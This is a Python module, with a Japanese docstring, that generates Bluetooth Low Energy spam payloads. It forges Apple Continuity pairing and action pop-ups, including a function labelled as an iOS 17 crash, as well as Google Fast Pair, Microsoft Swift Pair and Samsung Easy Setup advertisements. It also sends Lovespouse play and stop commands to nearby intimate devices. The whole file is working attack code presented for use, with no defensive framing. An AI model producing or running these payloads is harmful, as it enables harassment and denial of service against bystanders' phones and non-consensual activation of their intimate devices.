"""
BLE Spam Payload Generators
全プラットフォーム共通のペイロード生成ロジック
"""

import random
import struct


def hex_to_bytes(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)


def random_bytes(n: int) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(n))


# Manufacturer IDs
MANUFACTURER_APPLE = 0x004C      # 76
MANUFACTURER_MICROSOFT = 0x0006  # 6
MANUFACTURER_SAMSUNG = 0x0075    # 117
MANUFACTURER_TYPO = 0x00FF       # 255

# Google Fast Pair Service UUID
UUID_GOOGLE_FAST_PAIR = "0000fe2c-0000-1000-8000-00805f9b34fb"

# ============================================================
# Apple Continuity Payloads
# ============================================================

APPLE_DEVICES = {
    "AirPods": "0220",
    "AirPods Pro": "0E20",
    "AirPods Max": "0A20",
    "AirPods 2nd Gen": "0F20",
    "AirPods 3rd Gen": "1320",
    "AirPods Pro 2nd Gen": "1420",
    "Powerbeats Pro": "0B20",
    "Beats Solo Pro": "0C20",
    "Beats Studio Buds": "1120",
    "Beats Flex": "1020",
    "Beats X": "0520",
    "Beats Solo 3": "0620",
    "Beats Studio 3": "0920",
    "Beats Studio Pro": "1720",
    "Beats Fit Pro": "1220",
    "Beats Studio Buds+": "1620",
}

APPLE_ACTION_MODALS = {
    "AppleTV AutoFill": "13",
    "AppleTV Connecting": "27",
    "Join This AppleTV?": "20",
    "AppleTV Audio Sync": "19",
    "AppleTV Color Balance": "1E",
    "Setup New iPhone": "09",
    "Transfer Phone Number": "02",
    "HomePod Setup": "0B",
    "Setup New AppleTV": "01",
    "Pair AppleTV": "06",
    "HomeKit AppleTV Setup": "0D",
    "AppleID for AppleTV?": "2B",
    "Apple Watch": "05",
    "Apple Vision Pro": "24",
    "Connect to Device": "2F",
    "Software Update": "21",
}


def apple_new_device_popup(device_key: str = None) -> tuple:
    """Apple Continuity - New Device Pop-up"""
    if device_key is None:
        device_key = random.choice(list(APPLE_DEVICES.values()))
    payload = (
        "0719"  # continuityType=0x07 ProximityPair, size=0x19
        "07"    # prefix: NEW DEVICE
        + device_key
        + "55"  # status
        + format(random.randint(0, 99), "02x")   # buds battery
        + format(random.randint(0, 79), "02x")   # case battery
        + format(random.randint(0, 255), "02x")   # lid counter
        + "00"  # color
        + "00"  # padding
    )
    payload += random_bytes(16).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


def apple_not_your_device_popup(device_key: str = None) -> tuple:
    """Apple Continuity - Not Your Device Pop-up"""
    if device_key is None:
        device_key = random.choice(list(APPLE_DEVICES.values()))
    payload = (
        "0719"
        "01"    # prefix: NOT YOUR DEVICE
        + device_key
        + "55"
        + format(random.randint(0, 99), "02x")
        + format(random.randint(0, 79), "02x")
        + format(random.randint(0, 255), "02x")
        + "00"
        + "00"
    )
    payload += random_bytes(16).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


def apple_new_airtag_popup() -> tuple:
    """Apple Continuity - New AirTag Pop-up"""
    device_key = random.choice(["0055", "0030"])  # AirTag, Hermes AirTag
    payload = (
        "0719"
        "05"    # prefix: AIRTAG
        + device_key
        + "55"
        + format(random.randint(0, 99), "02x")
        + format(random.randint(0, 79), "02x")
        + format(random.randint(0, 255), "02x")
        + "00"
        + "00"
    )
    payload += random_bytes(16).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


def apple_action_modal(action_code: str = None) -> tuple:
    """Apple Continuity - Action Modal (AppleTV, HomePod, etc.)"""
    if action_code is None:
        action_code = random.choice(list(APPLE_ACTION_MODALS.values()))
    payload = "0F05C0" + action_code + random_bytes(3).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


def apple_ios17_crash() -> tuple:
    """Apple Continuity - iOS 17 Crash (patched in iOS 17.2+/18)"""
    action_code = random.choice(list(APPLE_ACTION_MODALS.values()))
    payload = "0F05C0" + action_code + random_bytes(3).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


# ============================================================
# Google Fast Pair Payloads
# ============================================================

FAST_PAIR_DEVICES = {
    "Google Pixel Buds": "060000",
    "Google Pixel Buds Pro": "D800FE",
    "Sony WF-1000XM4": "D446A7",
    "Sony WF-1000XM5": "CC4402",
    "Samsung Galaxy Buds2 Pro": "A168DE",
    "Samsung Galaxy Buds FE": "E49C6C",
    "Samsung Galaxy Buds Pro": "4A2728",
    "JBL Tune Flex": "F52494",
    "JBL Live Pro 2": "718FA4",
    "Nothing Ear (1)": "92BBBD",
    "Bose QC Earbuds II": "F57B84",
    "Flipper Zero": "D99CA1",
    "Free Robux": "77FF67",
    "Boykisser": "87B25F",
}


def google_fast_pair(device_id: str = None) -> tuple:
    """Google Fast Pair device advertisement"""
    if device_id is None:
        device_id = random.choice(list(FAST_PAIR_DEVICES.values()))
    service_data = hex_to_bytes(device_id)
    return UUID_GOOGLE_FAST_PAIR, service_data


# ============================================================
# Microsoft Swift Pair Payloads
# ============================================================

SWIFT_PAIR_NAMES = [
    "Device 1", "Device 2", "Device 3", "Device 4", "Device 5",
    "Keyboard", "Mouse", "Headphones", "Speaker", "Controller",
]


def microsoft_swift_pair(device_name: str = None) -> tuple:
    """Microsoft Swift Pair advertisement"""
    if device_name is None:
        device_name = random.choice(SWIFT_PAIR_NAMES)
    prefix = hex_to_bytes("030080")
    name_bytes = device_name.encode("utf-8")
    payload = prefix + name_bytes
    return MANUFACTURER_MICROSOFT, payload


# ============================================================
# Samsung Easy Setup Payloads
# ============================================================

SAMSUNG_BUDS = {
    "Fallback Buds": "EE7A0C",
    "Light Purple Buds2": "39EA48",
    "Bluish Silver Buds2": "A7C62C",
    "Black Buds Live": "850116",
    "White Buds Live": "3B6D02",
    "Black Buds Pro": "3F6A45",
    "White Buds Pro": "220544",
    "Violet Buds Pro": "EF4563",
    "Black Buds2 Pro": "6E5F20",
    "Bora Purple Buds2 Pro": "EC4B27",
}

SAMSUNG_WATCHES = {
    "White Watch4 Classic 44m": "01",
    "Black Watch4 44mm": "04",
    "Silver Watch4 44mm": "03",
    "Black Watch5 Pro 45mm": "15",
    "Gray Watch5 Pro 45mm": "14",
    "Black Watch5 44mm": "0E",
    "Sapphire Watch5 44mm": "0F",
    "Silver Watch6 Classic 47mm": "1B",
    "Black Watch6 Classic 43mm": "1C",
    "Graphite Watch6 44mm": "17",
}


def samsung_buds(device_id: str = None) -> tuple:
    """Samsung Easy Setup - Buds"""
    if device_id is None:
        device_id = random.choice(list(SAMSUNG_BUDS.values()))
    dev_bytes = hex_to_bytes(device_id)
    prefix = hex_to_bytes("42098102141503210109")
    # device_bytes[0], device_bytes[1], 0x01, device_bytes[2]
    mid = bytes([dev_bytes[0], dev_bytes[1], 0x01, dev_bytes[2]])
    suffix = hex_to_bytes("063C948E00000000C700")
    payload = prefix + mid + suffix
    return MANUFACTURER_SAMSUNG, payload


def samsung_watch(watch_id: str = None) -> tuple:
    """Samsung Easy Setup - Watch"""
    if watch_id is None:
        watch_id = random.choice(list(SAMSUNG_WATCHES.values()))
    prefix = hex_to_bytes("010002000101FF000043")
    payload = prefix + hex_to_bytes(watch_id)
    return MANUFACTURER_SAMSUNG, payload


# ============================================================
# Lovespouse Payloads
# ============================================================

LOVESPOUSE_PLAY_IDS = [
    "E49C6C", "E09B6F", "E29D6D", "E19A6E", "E39F6B",
    "D49C6C", "D09B6F", "D29D6D", "D19A6E", "D39F6B",
    "A49C6C", "A09B6F", "A29D6D", "A19A6E", "A39F6B",
]

LOVESPOUSE_STOP_IDS = [
    "E5157D", "D5964C", "A5113F",
]


def lovespouse_play(device_id: str = None) -> tuple:
    """Lovespouse - Play command"""
    if device_id is None:
        device_id = random.choice(LOVESPOUSE_PLAY_IDS)
    prefix = hex_to_bytes("FFFF006DB643CE97FE427C")
    dev = hex_to_bytes(device_id)
    suffix = hex_to_bytes("03038FAE")
    payload = prefix + dev + suffix
    return MANUFACTURER_TYPO, payload


def lovespouse_stop(device_id: str = None) -> tuple:
    """Lovespouse - Stop command"""
    if device_id is None:
        device_id = random.choice(LOVESPOUSE_STOP_IDS)
    prefix = hex_to_bytes("FFFF006DB643CE97FE427C")
    dev = hex_to_bytes(device_id)
    suffix = hex_to_bytes("03038FAE")
    payload = prefix + dev + suffix
    return MANUFACTURER_TYPO, payload


# ============================================================
# All generators mapped
# ============================================================

ALL_GENERATORS = {
    # Apple
    "apple_new_device": apple_new_device_popup,
    "apple_not_your_device": apple_not_your_device_popup,
    "apple_new_airtag": apple_new_airtag_popup,
    "apple_action_modal": apple_action_modal,
    "apple_ios17_crash": apple_ios17_crash,
    # Google
    "google_fast_pair": google_fast_pair,
    # Microsoft
    "microsoft_swift_pair": microsoft_swift_pair,
    # Samsung
    "samsung_buds": samsung_buds,
    "samsung_watch": samsung_watch,
    # Lovespouse
    "lovespouse_play": lovespouse_play,
    "lovespouse_stop": lovespouse_stop,
}
